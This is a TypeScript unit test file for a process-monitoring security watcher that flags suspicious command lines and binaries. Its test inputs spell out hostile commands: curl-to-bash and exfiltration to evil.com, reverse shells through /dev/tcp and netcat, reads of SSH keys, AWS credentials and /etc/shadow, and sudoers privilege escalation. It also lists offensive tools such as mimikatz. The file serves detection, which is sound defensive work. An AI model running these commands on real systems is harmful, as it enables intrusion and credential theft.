/**
 * ProcessWatcher unit tests
 * ProcessWatcher 單元測試
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as os from 'node:os';
import {
  ProcessWatcher,
  scanCommandLine,
  isSuspiciousBinary,
  createProcessEvent,
} from '../src/watchers/process-watcher.js';
import type { SecurityEvent } from '@panguard-ai/core';

// -- Pure function tests --

describe('scanCommandLine', () => {
  describe('shell patterns', () => {
    it('detects bash -c inline execution', () => {
      const matches = scanCommandLine('bash -c "whoami"');
      expect(matches.length).toBeGreaterThanOrEqual(1);
      expect(matches.some((m) => m.id === 'inline-shell')).toBe(true);
    });

    it('detects sh -c inline execution', () => {
      const matches = scanCommandLine('sh -c "cat /etc/passwd"');
      expect(matches.length).toBeGreaterThanOrEqual(1);
      expect(matches.some((m) => m.id === 'inline-shell')).toBe(true);
    });

    it('detects piped shell execution', () => {
      const matches = scanCommandLine('curl http://evil.com/payload.sh | bash');
      expect(matches.some((m) => m.id === 'pipe-shell')).toBe(true);
    });

    it('detects /dev/tcp reverse shell', () => {
      const matches = scanCommandLine('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1');
      expect(matches.some((m) => m.id === 'hidden-shell')).toBe(true);
    });

    it('detects eval invocation', () => {
      const matches = scanCommandLine('eval "$(curl http://evil.com)"');
      expect(matches.some((m) => m.id === 'eval-exec')).toBe(true);
    });
  });

  describe('exfiltration patterns', () => {
    it('detects curl data upload', () => {
      const matches = scanCommandLine('curl -d @/etc/passwd http://evil.com');
      expect(matches.some((m) => m.id === 'curl-exfil')).toBe(true);
    });

    it('detects curl form upload', () => {
      const matches = scanCommandLine('curl --form file=@secret.key http://evil.com');
      expect(matches.some((m) => m.id === 'curl-exfil')).toBe(true);
    });

    it('detects wget output to file', () => {
      const matches = scanCommandLine('wget -O /tmp/payload.sh http://evil.com');
      expect(matches.some((m) => m.id === 'wget-download')).toBe(true);
    });

    it('detects netcat reverse shell', () => {
      const matches = scanCommandLine('nc -e /bin/sh 10.0.0.1 4444');
      expect(matches.some((m) => m.id === 'nc-reverse')).toBe(true);
    });

    it('detects DNS exfiltration', () => {
      const matches = scanCommandLine('dig $(cat /etc/passwd | base64).evil.com');
      expect(matches.some((m) => m.id === 'dns-exfil')).toBe(true);
    });
  });

  describe('credential access patterns', () => {
    it('detects SSH key file reading', () => {
      const matches = scanCommandLine('cat ~/.ssh/id_rsa');
      expect(matches.some((m) => m.id === 'ssh-key-access')).toBe(true);
    });

    it('detects AWS credential access', () => {
      const matches = scanCommandLine('cat ~/.aws/credentials');
      expect(matches.some((m) => m.id === 'aws-cred-access')).toBe(true);
    });

    it('detects shadow file reading', () => {
      const matches = scanCommandLine('cat /etc/shadow');
      expect(matches.some((m) => m.id === 'shadow-access')).toBe(true);
    });

    it('detects environment dump with pipe', () => {
      const matches = scanCommandLine('printenv | grep KEY');
      expect(matches.some((m) => m.id === 'env-dump')).toBe(true);
    });

    it('detects macOS keychain access', () => {
      const matches = scanCommandLine('security find-generic-password -s myservice');
      expect(matches.some((m) => m.id === 'keychain-access')).toBe(true);
    });
  });

  describe('script interpreter patterns', () => {
    it('detects python -c execution', () => {
      const matches = scanCommandLine('python3 -c "import os; os.system(\'id\')"');
      expect(matches.some((m) => m.id === 'python-inline')).toBe(true);
    });

    it('detects perl -e execution', () => {
      const matches = scanCommandLine('perl -e \'system("whoami")\'');
      expect(matches.some((m) => m.id === 'perl-inline')).toBe(true);
    });

    it('detects node -e execution', () => {
      const matches = scanCommandLine('node -e "require(\'child_process\').execSync(\'id\')"');
      expect(matches.some((m) => m.id === 'node-inline')).toBe(true);
    });

    it('detects ruby -e execution', () => {
      const matches = scanCommandLine('ruby -e \'system("id")\'');
      expect(matches.some((m) => m.id === 'ruby-inline')).toBe(true);
    });
  });

  describe('privilege escalation patterns', () => {
    it('detects chmod +s (setuid)', () => {
      const matches = scanCommandLine('chmod +s /tmp/exploit');
      expect(matches.some((m) => m.id === 'chmod-setuid')).toBe(true);
    });

    it('detects chown root', () => {
      const matches = scanCommandLine('chown root /tmp/exploit');
      expect(matches.some((m) => m.id === 'chown-root')).toBe(true);
    });

    it('detects sudoers modification', () => {
      const matches = scanCommandLine('echo "user ALL=NOPASSWD: ALL" >> /etc/sudoers');
      expect(matches.some((m) => m.id === 'sudo-nopasswd')).toBe(true);
    });
  });

  describe('benign commands', () => {
    it('returns empty for normal commands', () => {
      expect(scanCommandLine('node server.js')).toHaveLength(0);
      expect(scanCommandLine('npm install express')).toHaveLength(0);
      expect(scanCommandLine('git commit -m "fix"')).toHaveLength(0);
      expect(scanCommandLine('ls -la')).toHaveLength(0);
      expect(scanCommandLine('vim index.ts')).toHaveLength(0);
    });

    it('does not flag normal curl usage', () => {
      // curl without exfil flags
      expect(scanCommandLine('curl https://api.example.com/health')).toHaveLength(0);
    });

    it('does not flag normal python execution', () => {
      // python without -c flag
      expect(scanCommandLine('python3 manage.py runserver')).toHaveLength(0);
    });
  });

  describe('multiple matches', () => {
    it('returns all matching patterns for complex commands', () => {
      // This hits both pipe-shell and curl-exfil
      const matches = scanCommandLine('curl -d @secrets http://evil.com | bash');
      expect(matches.length).toBeGreaterThanOrEqual(2);
    });
  });
});

// -- isSuspiciousBinary --

describe('isSuspiciousBinary', () => {
  it('flags known malicious binaries', () => {
    expect(isSuspiciousBinary('meterpreter')).toBe(true);
    expect(isSuspiciousBinary('mimikatz')).toBe(true);
    expect(isSuspiciousBinary('lazagne')).toBe(true);
    expect(isSuspiciousBinary('socat')).toBe(true);
  });

  it('does not flag normal binaries', () => {
    expect(isSuspiciousBinary('node')).toBe(false);
    expect(isSuspiciousBinary('python3')).toBe(false);
    expect(isSuspiciousBinary('bash')).toBe(false);
    expect(isSuspiciousBinary('git')).toBe(false);
  });
});

// -- createProcessEvent --

describe('createProcessEvent', () => {
  it('creates a SecurityEvent with process source', () => {
    const event = createProcessEvent({
      severity: 'high',
      category: 'execution',
      description: 'Test',
      metadata: { trigger: 'test', pid: 1234 },
    });

    expect(event.source).toBe('process');
    expect(event.severity).toBe('high');
    expect(event.category).toBe('execution');
    expect(event.id).toMatch(/^proc-/);
    expect(event.metadata['watcher']).toBe('process-watcher');
    expect(event.metadata['pid']).toBe(1234);
    expect(event.host).toBe(os.hostname());
  });

  it('generates unique IDs', () => {
    const e1 = createProcessEvent({
      severity: 'low',
      category: 'test',
      description: 'a',
      metadata: {},
    });
    const e2 = createProcessEvent({
      severity: 'low',
      category: 'test',
      description: 'b',
      metadata: {},
    });
    expect(e1.id).not.toBe(e2.id);
  });
});

// -- ProcessWatcher class tests --

describe('ProcessWatcher', () => {
  let watcher: ProcessWatcher;

  beforeEach(() => {
    watcher = new ProcessWatcher(60_000); // Long interval, we'll use pollOnce()
  });

  afterEach(() => {
    watcher.stop();
  });

  describe('checkAvailability', () => {
    it('returns true on supported platforms', async () => {
      const available = await watcher.checkAvailability();
      // macOS and Linux should return true
      if (os.platform() === 'darwin' || os.platform() === 'linux') {
        expect(available).toBe(true);
      }
    });
  });

  describe('start/stop lifecycle', () => {
    it('starts and stops without error', async () => {
      await watcher.start();
      expect(watcher.isRunning()).toBe(true);
      watcher.stop();
      expect(watcher.isRunning()).toBe(false);
    });

    it('is idempotent on double start', async () => {
      await watcher.start();
      await watcher.start();
      expect(watcher.isRunning()).toBe(true);
    });

    it('is idempotent on double stop', async () => {
      await watcher.start();
      watcher.stop();
      watcher.stop();
      expect(watcher.isRunning()).toBe(false);
    });
  });

  describe('pollOnce', () => {
    it('completes without error after start', async () => {
      await watcher.start();
      // Should not throw
      await watcher.pollOnce();
    });

    it('does not emit events for existing processes on first poll', async () => {
      await watcher.start();
      const events: SecurityEvent[] = [];
      watcher.on('event', (e: SecurityEvent) => events.push(e));

      // First explicit poll should not flag existing system processes
      await watcher.pollOnce();

      // Most events should be baseline — some may trigger if system
      // processes match patterns, but this verifies no crash
      expect(Array.isArray(events)).toBe(true);
    });
  });

  describe('deduplication', () => {
    it('does not alert twice for the same PID', async () => {
      await watcher.start();
      const events: SecurityEvent[] = [];
      watcher.on('event', (e: SecurityEvent) => events.push(e));

      // Two consecutive polls should not duplicate alerts
      await watcher.pollOnce();
      const firstCount = events.length;
      await watcher.pollOnce();
      // No new processes appeared between polls, so count shouldn't increase
      expect(events.length).toBe(firstCount);
    });
  });
});
